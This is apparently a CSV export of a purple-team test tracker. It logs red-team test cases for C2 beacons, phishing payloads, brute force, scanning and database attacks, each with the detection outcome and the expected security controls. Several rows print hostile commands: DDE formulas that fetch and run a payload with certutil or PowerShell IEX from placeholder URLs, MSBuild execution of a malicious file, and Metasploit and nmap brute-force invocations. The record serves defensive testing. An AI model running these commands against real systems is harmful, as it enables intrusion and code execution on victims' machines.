Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Cobalt Strike Custom Beacon HTTPS payload over tcp/443,T1095,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2018-01-12T08:21:28.130Z,1515745288130,2018-01-12T10:13:02.130Z,1515751982130,2018-01-12T12:04:43.130Z,1515758683130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Create malleable c2 profile

./teamserver [external IP] [password] [/path/to/my.profile]",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,C2 Channels,Discovery,Egress Buster,T1046,,Network egress checks,Completed,Detected,Info,TBD,Yes,,1) Egress busting scan is detected by IDS/IPS or firewall,,,"Web Gateway,Firewall,Secure Baselines",MUSHA,2018-01-12T21:53:52.130Z,1515794032130,2018-01-12T23:12:58.130Z,1515798778130,2019-01-28T17:38:31.119Z,1548697111119,Security Risk Advisors,,"Identify allowed egress services and ports, including all TCP ports and common UDP ports.",,,Low,Low,Internal,Low,,,,Egress Buster
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Empire Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2018-01-12T13:37:23.130Z,1515764243130,2018-01-12T13:44:55.130Z,1515764695130,2018-01-12T14:17:28.130Z,1515766648130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","uselistener http

Stageless:
launchers <powershell or python> <listener name>

Staged:
usestager <stager-option>
set <option-name> <option-value>
execute",,Medium,High,Both,Medium,,,,Empire
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon SMB over tcp/445,T1571,,C2 channel,Completed,Blocked,TBD,No,TBD,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.,2) Suspicious SMB netconns and pivoting from internal systems is detected by EDR or behavioral tools. Examples may include unusual SMB connections from domain controllers and other critical assets.",,,"Firewall,EDR,Behavior Analytics",MUSHA,2018-01-12T18:00:59.130Z,1515780059130,2018-01-12T18:27:49.130Z,1515781669130,2018-01-12T20:18:53.130Z,1515788333130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various SMB.",Generate default SMB beacon using cobalt strike,,Medium,High,Internal,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTP payload over tcp/80,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2018-01-11T21:11:52.130Z,1515705112130,2018-01-11T22:36:12.130Z,1515710172130,2018-01-12T00:24:51.130Z,1515716691130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.",Create a http listener,,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Beacon DNS over udp/53,T1571,,C2 channel,Completed,Blocked,TBD,No,No,,"1) SIEM rules are configured to detect and alert on suspicious DNS traffic,12 Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Firewall,Secure Baselines,Behavior Analytics",MUSHA,2018-01-12T14:29:53.130Z,1515767393130,2018-01-12T16:25:15.130Z,1515774315130,2019-01-28T17:38:11.080Z,1548697091080,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Purchase a domain name

Create a windows/beacon_dns/reverse_dns_txt listener",,Medium,High,Both,High,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,C2 Channels,Command & Control,Cobalt Strike Default Beacon HTTPS payload over tcp/443,T1571,,C2 channel,Completed,NotDetected,TBD,TBD,Yes,,"1) Payload that initiates C2 channel is detected by EDR or other endpoint security controls, or C2 channel is detected by proxy, firewall, or network behavioral/UEBA tool.",,,"Web Gateway,Firewall,Behavior Analytics",,2018-01-12T02:18:26.130Z,1515723506130,2018-01-12T03:11:42.130Z,1515726702130,2018-01-12T04:15:19.130Z,1515730519130,Security Risk Advisors,,"Run backdoor executable on endpoint, attempt to connect back to server over various TCP, UDP, and HTTP channels.","Install SSL Certs From Lets Encrypt onto the server

Create a https listener",,Medium,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,9 - Link - Macro - LuckyStrike PowerShell CellEmbed,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T22:30:11.130Z,1515450611130,2018-01-09T00:22:41.130Z,1515457361130,2018-01-09T01:02:23.130Z,1515459743130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,4 - Link - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T09:06:13.130Z,1515402373130,2018-01-08T09:24:15.130Z,1515403455130,2018-01-08T10:12:41.130Z,1515406361130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,12 - Link - Macro - MMG WMI Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T08:55:22.130Z,1515488122130,2018-01-09T09:42:59.130Z,1515490979130,2018-01-09T10:50:39.130Z,1515495039130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,3 - Link - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T06:43:03.130Z,1515393783130,2018-01-08T06:53:27.130Z,1515394407130,2018-01-08T08:05:29.130Z,1515398729130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,15 - Link - Archive - Macro,T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-09T06:19:43.130Z,1515478783130,2018-01-09T08:10:27.130Z,1515485427130,2018-01-09T08:49:46.130Z,1515487786130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,6 - Link - Macro - WScript EXE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T14:51:12.130Z,1515423072130,2018-01-08T15:45:11.130Z,1515426311130,2019-01-28T16:58:01.782Z,1548694681782,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,13 - Link - DDE - Exe,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T11:32:28.130Z,1515497548130,2018-01-09T13:31:12.130Z,1515504672130,2018-01-09T14:26:18.130Z,1515507978130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,8 - Link - Macro - MMG WMI PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T20:29:57.130Z,1515443397130,2018-01-08T21:02:33.130Z,1515445353130,2018-01-08T21:50:13.130Z,1515448213130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,19 - Link - Encrypted Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-10T02:18:18.130Z,1515550698130,2018-01-10T03:16:30.130Z,1515554190130,2018-01-10T04:08:55.130Z,1515557335130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,1 - Link - Macro - Cobalt Strike Standard,T1566.002,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-08T00:34:06.130Z,1515371646130,2018-01-08T00:35:52.130Z,1515371752130,2018-01-08T02:27:15.130Z,1515378435130,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,10 - Link - Macro - MSBuild,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T02:07:58.130Z,1515463678130,2018-01-09T02:37:17.130Z,1515465437130,2018-01-09T02:43:15.130Z,1515465795130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,5 - Link - Macro - WScript PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T11:53:32.130Z,1515412412130,2018-01-08T13:28:17.130Z,1515418097130,2019-01-28T16:57:43.971Z,1548694663971,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,16 - Link - Archive - DDE,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T16:31:30.130Z,1515515490130,2018-01-09T16:35:14.130Z,1515515714130,2018-01-09T17:52:40.130Z,1515520360130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,22 - Link - Link Inside Office Document,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-10T10:54:53.130Z,1515581693130,2018-01-10T12:54:10.130Z,1515588850130,2018-01-10T13:53:59.130Z,1515592439130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,20 - Link - Password-protected Office Doc - Standard CS payload,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-10T05:31:07.130Z,1515562267130,2018-01-10T06:03:19.130Z,1515564199130,2018-01-10T06:21:39.130Z,1515565299130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,2 - Link - Macro - CobaltStrike Standard (MMG),T1566.002,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Twin Hawk,2018-01-08T03:28:36.130Z,1515382116130,2018-01-08T04:57:29.130Z,1515387449130,2018-01-08T05:10:46.130Z,1515388246130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,7 - Link - Macro - WScript PowerShell XOR,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-08T17:44:34.130Z,1515433474130,2018-01-08T19:30:47.130Z,1515439847130,2018-01-08T20:00:09.130Z,1515441609130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,17 - Link - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T19:30:20.130Z,1515526220130,2018-01-09T19:55:16.130Z,1515527716130,2018-01-09T21:52:00.130Z,1515534720130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,21 - Link - Link Inside PDF,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-10T07:57:31.130Z,1515571051130,2018-01-10T09:57:11.130Z,1515578231130,2018-01-10T10:39:57.130Z,1515580797130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,11 - Link - DDE - PowerShell,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T03:11:46.130Z,1515467506130,2018-01-09T04:42:47.130Z,1515472967130,2018-01-09T06:13:12.130Z,1515478392130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,18 - Link - Encrypted Archive - Macro,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T21:58:25.130Z,1515535105130,2018-01-09T23:40:14.130Z,1515541214130,2018-01-10T00:59:43.130Z,1515545983130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2018 Q1,Email with Malicious Links,Delivery,14 - Link - Macro - Remote Template,T1566.002,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2018-01-09T14:44:42.130Z,1515509082130,2018-01-09T15:35:40.130Z,1515512140130,2018-01-09T16:24:35.130Z,1515515075130,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Remote Access Portal - SSO Login,T1190,,Password Guessing,Completed,Detected,High,TBD,No,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-01-03T22:42:27.130Z,1515019347130,2018-01-03T23:54:59.130Z,1515023699130,2019-01-29T06:15:13.647Z,1548742513647,Security Risk Advisors,,"Brute force single password, large list of potential users","Capture login request
Brute force with intruder",,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Customer Portal Brute Force,T1190,,Password Guessing,Completed,NotDetected,TBD,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",,2018-01-04T06:00:48.130Z,1515045648130,2018-01-04T07:39:35.130Z,1515051575130,2018-01-04T09:21:13.130Z,1515057673130,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Remote Access Portal - Office 365,T1190,,Password Guessing,Completed,Detected,High,TBD,TBD,,"1) Large number of authentication requests detected by WAF, IDS/IPS, or firewall.,2) Application logs are sent to a SIEM for further analysis, correlation and alerting.",,,"SIEM,WAF",Progear,2018-01-04T02:40:52.130Z,1515033652130,2018-01-04T04:12:40.130Z,1515039160130,2019-01-28T16:37:29.216Z,1548693449216,Security Risk Advisors,,Brute force with large list of potential users,,,High,High,External,Low,,,,BurpSuite
Enterprise Purple – 2018 Q1,External Password Attacks,Exploitation,Simultaneous VPN Logins from different Geo's,T1078,,Suspicious Logins,Completed,Detected,High,TBD,TBD,,"1) VPN authentication logs are sent to a SIEM for further analysis, correlation and alerting",,,"Firewall,SIEM",Progear,2018-01-04T10:50:14.130Z,1515063014130,2018-01-04T11:35:48.130Z,1515065748130,2019-01-28T16:50:42.006Z,1548694242006,Security Risk Advisors,,Login from two distinct geo's to test detection capabilities.,,,Medium,Medium,External,Low,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,"Internal - Stealth Port Scan with 3 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detected by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2018-01-17T23:24:06.130Z,1516231446130,2018-01-17T23:36:28.130Z,1516232188130,2018-01-18T00:25:17.130Z,1516235117130,Security Risk Advisors,,Run lighter internal port scanning to probe interesting HTTP ports and services.,,,High,Low,Internal,Medium,,,,Nmap
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-01-18T03:23:10.130Z,1516245790130,2018-01-18T04:26:17.130Z,1516249577130,2018-01-18T04:51:36.130Z,1516251096130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 1,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,SIEM,,2018-01-18T01:34:45.130Z,1516239285130,2018-01-18T02:44:18.130Z,1516243458130,2018-01-18T03:06:59.130Z,1516244819130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,,,,SIEM,,2018-01-18T07:42:31.130Z,1516261351130,2018-01-18T09:23:43.130Z,1516267423130,2018-01-18T11:13:48.130Z,1516274028130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - Tomcat,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,"SIEM,Behavior Analytics",,2018-01-18T06:50:22.130Z,1516258222130,2018-01-18T07:15:03.130Z,1516259703130,2018-01-18T07:29:45.130Z,1516260585130,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",msf> use auxiliary/scanner/http/tomcat_mgr_login,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T21:50:29.130Z,1516398629130,2018-01-19T22:18:04.130Z,1516400284130,2018-01-19T22:51:40.130Z,1516402300130,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2018-01-19T15:34:46.130Z,1516376086130,2018-01-19T16:07:42.130Z,1516378062130,2018-01-19T16:24:13.130Z,1516379053130,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2018-01-19T16:59:51.130Z,1516381191130,2018-01-19T17:47:51.130Z,1516384071130,2018-01-19T17:55:31.130Z,1516384531130,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2018 Q1,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2018-01-19T12:29:22.130Z,1516364962130,2018-01-19T14:00:23.130Z,1516370423130,2018-01-19T14:46:09.130Z,1516373169130,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2018 Q1,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,DLP,,2018-01-19T23:33:51.130Z,1516404831130,2018-01-20T00:49:33.130Z,1516409373130,2018-01-20T02:04:34.130Z,1516413874130,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
